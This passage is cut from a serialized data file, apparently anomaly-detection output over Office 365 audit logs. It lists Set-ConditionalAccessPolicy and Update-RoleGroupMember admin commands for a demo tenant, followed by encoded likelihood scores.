'{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/13/2020 2:49:19 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/13/2020 2:49:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/13/2020 5:26:09 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/13/2020 5:26:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/14/2020 2:18:53 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/14/2020 2:18:54 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/14/2020 5:38:47 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/14/2020 5:38:49 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/16/2020 1:57:15 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/16/2020 1:57:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/16/2020 5:00:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/16/2020 5:00:38 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/17/2020 1:59:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/17/2020 1:59:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/17/2020 5:14:40 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/17/2020 5:14:39 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/18/2020 2:24:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/18/2020 2:24:11 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/18/2020 2:24:11 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/18/2020 2:24:11 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/18/2020 5:19:26 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/18/2020 5:19:23 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/19/2020 2:29:04 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/19/2020 2:29:03 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/19/2020 5:55:34 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/19/2020 5:55:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Update-RoleGroupMember', params={'Members': 'CBoehmSA;ComplianceAdmins_939735849', 'Identity': 'Compliance Management'})\",\"Cmd(name='Update-RoleGroupMember', params={'Members': 'CBoehmSA', 'Identity': 'Discovery Management'})\",\"Cmd(name='Update-RoleGroupMember', params={'Members': 'CBoehmSA;ComplianceAdmins_939735849', 'Identity': 'Compliance Management'})\"]],\"rarest_window3_likelihood\":{\"__ndarray__\":\"iI8J8UNthD/Nxus4F+h6PySId8Fi4IU/L6XbyRT3ej/XmkpTpXiEP2x775tbwHc/iI8J8UNthD8kiHfBYuCFP0MXINrzg4Q/iI8J8UNthD/Nxus4F+h6P4iPCfFDbYQ/15pKU6V4hD8kiHfBYuCFP4iPCfFDbYQ/iI8J8UNthD+IjwnxQ22EP4iPCfFDbYQ/RjaRHgy9az/XmkpTpXiEPySId8Fi4IU/7KjSzS+PhD8kiHfBYuCFP9eaSlOleIQ/Qxcg2vODhD++aFZpz2GEP75oVmnPYYQ/Qxcg2vODhD+IjwnxQ22EP75oVmnPYYQ/tASIMvClej+3XR8WpJqEP4iPCfFDbYQ/Qxcg2vODhD8FVC1OYVaEPy+l28kU93o/E8zG2kPhej+IjwnxQ22EP/lOXF6QuHE/iI8J8UNthD++aFZpz2GEP75oVmnPYYQ/BVQtTmFWhD/XmkpTpXiEPwsG2UjqtHo/7KjSzS+PhD+IjwnxQ22EPwsG2UjqtHo/iI8J8UNthD++aFZpz2GEP/0SymkqbYQ/Qxcg2vODhD+IjwnxQ22EP0MXINrzg4Q/vmhWac9hhD+IjwnxQ22EPySId8Fi4IU/15pKU6V4hD++aFZpz2GEPySId8Fi4IU/W1VTvZPSej++aFZpz2GEP/0SymkqbYQ/j/evYwWmhD+IjwnxQ22EP75oVmnPYYQ/7KjSzS+PhD+IjwnxQ22EP75o